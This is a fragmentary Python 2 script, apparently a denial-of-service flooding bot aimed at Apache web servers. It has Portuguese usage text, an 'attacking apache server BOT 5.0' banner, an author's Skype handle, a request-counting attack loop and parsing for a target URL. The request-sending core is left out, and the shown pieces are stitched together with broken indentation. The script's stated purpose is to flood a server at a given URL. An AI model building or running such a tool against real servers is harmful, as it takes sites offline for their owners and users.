...
def usage():
	print '---------------------------------------------------'
	print 'Pra usar a ferramenta : python bot.py <url>'
	print ': Salve ~ General ~ Ecologyc ~ S1gma ~ Root@Encrypt : Powered By ECOSISTEMA ~ Skype : saulo.zaquetti '
	print "\a"
print \
"""                        .
                     
                    attacking apache server BOT 5.0
 /'        /|
           /         / |_            BOT 5.0
          /         /  //|          ATUALIZANDO SEMPRE
         /_________/  ////|      INSCREVA-SE NO CANAL
        |        | 8o////|          BY ECOSISTEMA
        | /'// )_  |   8///|        Skype : saulo.zaquetti
        |/ // // ) |   8o///|
        / // // //,|  /  8//|
       / // // /// | /   8//|
      / // // ///__|/    8//|
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Conectando em el server" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -BOT ATTACK"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "By: Ecosistema Own4ndo = skype : saulo.zaquetti"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
